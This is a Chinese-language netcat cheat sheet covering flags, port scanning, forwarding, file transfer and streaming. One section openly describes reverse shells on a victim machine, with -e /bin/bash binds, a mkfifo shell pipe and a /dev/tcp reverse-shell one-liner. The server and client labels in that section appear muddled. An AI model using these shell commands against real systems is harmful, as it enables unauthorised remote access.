# netcat
BSD版的不支技-c -e参数，而GNU版的有-e参数
## 基本命令
- server: nc -l [port_num]
- client: nc [host] [port]
## 参数
- 端口扫描：
    nc -z hostname 80-90
    tips：可以指定-w和发送一个通用消息探测服务器类型
    Ex: echo "QUIT" | nc host.example.com 20-30
- 指定客户端端口： 
    -p xxx
    -r 随机(默认)
- 指定本机使用出口ip
    -s addr
- 指定udp协议： -u
- 指定超时秒： -w xxx
- 输出详情: -v
- -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
- -e filename             program to exec after connect [dangerous!!]
## 场景
- 端口转发
  - 单向: `ncat -l 8080 | ncat target-ip 80`
  - 双向: `mkfifo 2way;ncat -l 2182 0<2way | ncat 127.0.0.1 2181 1>2way`
- 端口扫描:
    `nc -z -v -n 172.31.100.7 21-25`
- Chat Server:
    `nc -l 8080` and `nc server-ip 8080`
- 传文件(一次性)
    服务器->客户端:
     `nc -l 8080 < /var/www/index.html`
     `nc server-ip 8080 > /var/www/index.html`
- Shell(一次性),反向/反弹Shell
    反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上
    - Server(GNU NC) 支持`e`参数
    Server: `nc server-ip 1567` 
    Client: `nc -l 1567 -e /bin/bash -i`
    - Server(BSD NC) 不支持`e`参数
    Server: `nc server-ip 1567`
    Client:
    ```
        mkfifo /tmp/tmp_fifo
        cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp_fifo
    ```
    `/bin/bash -i >& /dev/tcp/192.168.0.4/7777`(待验证)
    
- 视频流
    Server: `cat video.avi | nc -l 1567`
    Client: `nc server-ip 1567 | mplayer -vo x11 -cache 3000 -`
